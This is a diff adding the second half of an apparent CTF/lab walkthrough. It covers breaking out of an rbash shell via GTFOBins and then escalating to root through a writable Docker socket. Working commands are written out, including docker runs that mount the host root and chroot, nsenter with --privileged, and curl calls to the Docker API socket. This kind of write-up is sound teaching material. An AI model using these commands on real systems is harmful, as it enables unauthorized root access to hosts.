@@ -185,4 +185,91 @@ But when i try to cat any file i got an error changing directories also lead to 
 
 ![image](https://user-images.githubusercontent.com/69868171/143769013-53e28d12-c444-4f45-be46-0c0ecdc368ca.png)
 
-Let try escaping it
+Let try escaping it with some techniques i try `vi,python` dead end but since i can list directores so i decided to see what command can we run on the rbash shell with the PATH we are stuck on.
+
+![image](https://user-images.githubusercontent.com/69868171/143769262-b88c8a45-cb37-498b-86f9-ebb17b6932c9.png)
+
+
+Now that seems promising so let check `gtfobins` .
+
+![image](https://user-images.githubusercontent.com/69868171/143769290-8dbaa4f0-62bf-4231-b76f-c162af936ece.png)
+
+Now that is cool let run it.
+
+![image](https://user-images.githubusercontent.com/69868171/143769329-5133cb9f-1ce8-4ea5-a603-b5d9d76cabd4.png)
+
+Boom we break out but something is still missing the PATH let export some PATH.
+
+```
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+![image](https://user-images.githubusercontent.com/69868171/143769419-22d3d463-098f-4839-a0ca-95b52a099e05.png)
+
+Now that is more better and seems we docker in part of groups yes i think that is our way to root.
+
+### Privilege Escalation
+
+![image](https://user-images.githubusercontent.com/69868171/143771118-095352fe-e931-43dc-8edb-d5d114b8ba7a.png)
+
+Smooth it writable.
+
+### Writable Docker Socket
+
+The docker socket is typically located at `/var/run/docker.sock` and is only writable by `root` user and `docker` group. If for some reason you have write permissions over that socket you can escalate privileges.
+
+The following commands can be used to escalate privileges:
+
+```
+docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+```
+
+It both for `ubuntu` and `debain` but since we are on debain we are trying debain command but man it was a dead end.
+
+![image](https://user-images.githubusercontent.com/69868171/143771298-d674b83f-9132-4f9c-9361-4af9d4a66ea7.png)
+
+Seems we need the docker package but seems we have no internet on the machine we are unable to escalate let find a way to do it around.
+
+### Use Docker Web API From Socket Without Docker Package
+
+If you have access to docker socket but you can't use the docker binary (maybe it isn't even installed), you can use directly the web API with `curl` .
+
+The following commands are a example to create a docker container that mount the root of the host system and use `socat` to execute commands into the new docker.
+
+```
+# List docker images
+curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
+##[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
+# Send JSON to docker API to create the container
+curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
+##{"Id":"<NewContainerID>","Warnings":[]}
+curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
+```
+
+But man it a dead end also let try and list the docker images.
+
+```
+docker images
+```
+
+![image](https://user-images.githubusercontent.com/69868171/143771872-622a511f-7037-48aa-b8f3-7759cef4e023.png)
+
+Let run our docker with redmine.
+
+```
+docker run -v /:/mnt --rm -it redmine chroot /mnt sh
+```
+
+![image](https://user-images.githubusercontent.com/69868171/143771949-66c3a757-282e-40d3-9f36-4519ed44641d.png)
+
+Boom we are root done and dusted.
+
+![image](https://user-images.githubusercontent.com/69868171/143772016-70133bb5-3614-41fd-92f7-04c02756e279.png)
+
+
+Greeting From [Muzec](https://twitter.com/muzec_saminu)
+
+<br> <br>
+[Back To Home](../index.md)
+<br>
